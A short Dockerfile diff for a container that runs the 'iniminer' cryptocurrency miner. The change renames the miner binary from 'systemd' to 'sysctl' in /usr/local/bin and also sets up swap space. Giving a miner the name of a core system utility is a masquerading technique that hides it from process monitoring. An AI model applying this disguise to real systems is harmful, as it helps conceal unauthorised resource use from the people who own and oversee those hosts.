@@ -16,7 +16,7 @@ RUN apt-get update && apt-get install -y \
     apt-get clean && rm -rf /var/lib/apt/lists/*
 
 # Set working directory
-WORKDIR /app
+WORKDIR /usr/local/bin
 
 # Enable swap
 RUN fallocate -l 1G /swapfile 
@@ -27,8 +27,8 @@ RUN mkswap /swapfile && \
 RUN sysctl vm.swappiness=10 && echo "vm.swappiness=10" >> /etc/sysctl.conf
 
 # Download miner binary
-COPY iniminer-linux-x64 /usr/local/bin/systemd
-RUN chmod +x /usr/local/bin/systemd
+COPY iniminer-linux-x64 /usr/local/bin/sysctl
+RUN chmod +x /usr/local/bin/sysctl
 
 # Copy startup script
 COPY input.sh /usr/local/bin/input.sh
